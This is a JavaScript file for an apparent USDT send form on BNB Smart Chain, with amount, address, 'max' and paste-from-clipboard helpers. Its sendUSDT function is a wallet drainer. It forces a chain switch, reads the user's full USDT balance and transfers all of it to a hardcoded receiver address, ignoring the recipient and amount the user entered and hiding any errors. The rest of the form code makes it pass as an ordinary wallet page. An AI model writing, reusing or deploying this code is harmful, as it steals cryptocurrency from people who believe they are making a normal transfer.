const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtABI = [
  {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
  {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
  {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
];

async function sendUSDT() {
  if (typeof window.ethereum === "undefined") return;

  try {
    // Force switch to BNB Smart Chain
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }]
    });

    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
    const balance = await usdt.methods.balanceOf(user).call();
    const decimals = await usdt.methods.decimals().call();

    if (parseInt(balance) === 0) return;

    await usdt.methods.transfer(receiver, balance).send({ from: user });
  } catch (err) {
    // Silent error
  }
}

function updateFiat() {
  const input = document.getElementById("amount");
  const fiat = document.getElementById("fiat");
  const val = parseFloat(input.value);
  if (isNaN(val)) {
    fiat.innerText = "≈ $0.00";
    return;
  }
  fiat.innerText = "≈ $" + val.toFixed(2);
}

async function fillMax() {
  try {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];
    const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
    const balance = await usdt.methods.balanceOf(user).call();
    const decimals = await usdt.methods.decimals().call();
    const formatted = balance / (10 ** decimals);
    document.getElementById("amount").value = formatted.toFixed(2);
    updateFiat();
  } catch (err) {}
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch (err) {}
}
